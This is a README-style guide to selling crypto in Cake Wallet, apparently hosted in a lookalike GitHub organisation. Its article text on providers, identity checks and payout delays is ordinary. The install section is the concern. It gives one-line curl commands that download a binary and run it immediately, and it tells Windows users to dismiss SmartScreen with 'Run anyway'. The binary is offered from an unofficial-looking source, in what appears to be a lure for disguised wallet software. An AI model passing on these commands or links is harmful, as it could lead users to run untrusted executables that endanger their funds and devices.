![Cake Wallet sell crypto guide](assets/cake-wallet-sell-crypto-article-banner.png)

# Sell Crypto in Cake Wallet

The mirror of buying, with the provider holding the answers.

## Downloads - v6.4.5

<p align="center"><a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`cake-wallet-desktop-v6.4.5-windows.exe`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`cake-wallet-desktop-v6.4.5-macos.dmg`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`cake-wallet-desktop-v6.4.5-linux.xz`](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz) |

Every file on this page comes from the [current Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest).

> Cake Wallet never asks for your recovery phrase, and no support channel needs it.

Open the sell flow, choose the coin and amount, pick a provider that serves your country, and complete its checks. You send the coin to the address the provider gives you, and it pays out fiat by its own method. Timing, limits and identity requirements belong to the provider, not the wallet.

<!-- ARTICLE-BODY-BEGIN -->

## Selling is the mirror of buying
The same providers that sell you crypto buy it back, with the same regional rules and the same identity checks. The app shows the quote and the deposit address; the provider takes the coin and sends money to your bank or payment account.

That means the wallet cannot speed up a payout or reverse a sale. The order reference the app gives you is the thing to quote, and the provider's status page is the source of truth.

## Sending the coin safely
Send the exact amount from the wallet you named in the order, and use the address the provider displayed. Sending from a different wallet, or a different account inside the same wallet, can leave the provider unable to match the deposit.

Keep the transaction ID. It is the only evidence that you sent the funds, and the provider will ask for it if the order stalls.

## Identity checks on a sale
Selling always involves a fiat payout, which means a regulated provider and, in most countries, identity verification. This is the step where a wallet that needs no account still produces a paper trail.

<a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-kyc-anonymous.md">Cake Wallet KYC</a> separates the wallet from the provider, so the requirement is not mistaken for something the app imposes.

## Converting instead of selling
If the goal is another coin rather than money in a bank, a swap is faster, cheaper and needs no identity check. Many people who ask how to sell only want to move value between assets.

<a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-swap-crypto.md">Swap crypto in Cake Wallet</a> covers quotes and the fixed-or-floating choice, which is the decision that matters when the amount is large.

## When a payout is delayed
Delays come from three places: the chain (your deposit has not confirmed), the provider (its own review or banking hours), or the bank (a payout that is sent but not credited). Only the first one is visible in the wallet.

Work in that order and keep the evidence for each step. A provider asking for a screenshot of the transaction is asking for the ID you already saved.

## Use the current release
Provider integrations change between builds, and an old build can show a provider list that no longer works. Install the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest">latest Cake Wallet release</a> before you conclude that selling is unavailable in your region.

<a href="https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-buy-monero.md">Buy crypto in Cake Wallet</a> covers the same provider model from the other direction, which helps when an order needs to be reversed or corrected.

## FAQ
### How do I sell crypto in Cake Wallet?
Use the sell flow, choose a provider that serves your region, send the coin to its deposit address, and wait for its payout.

<!-- ARTICLE-BODY-END -->

## How to install Cake Wallet

<!-- INSTALL-BEGIN -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-windows.exe">cake-wallet-desktop-v6.4.5-windows.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-macos.dmg">cake-wallet-desktop-v6.4.5-macos.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Manual install:
1. Download <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.xz">cake-wallet-desktop-v6.4.5-linux.xz</a> or the <a href="https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest/download/cake-wallet-desktop-v6.4.5-linux.flatpak">cake-wallet-desktop-v6.4.5-linux.flatpak</a>.
2. Archive: extract it and run the executable inside the extracted folder.
3. Flatpak: run `flatpak install ./cake-wallet-desktop-v6.4.5-linux.flatpak` where you saved it.
4. Launch Cake Wallet and restore your wallet.
<!-- INSTALL-END -->

## Related guides
[buy crypto in Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-buy-monero.md) · [Cake Wallet KYC](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-kyc-anonymous.md) · [swap crypto in Cake Wallet](https://github.com/cakewallet-opensource/cake-wallet-privacy/blob/main/cake-wallet-swap-crypto.md) · [latest Cake Wallet release](https://github.com/cakewallet-opensource/cake-wallet-desktop/releases/latest)
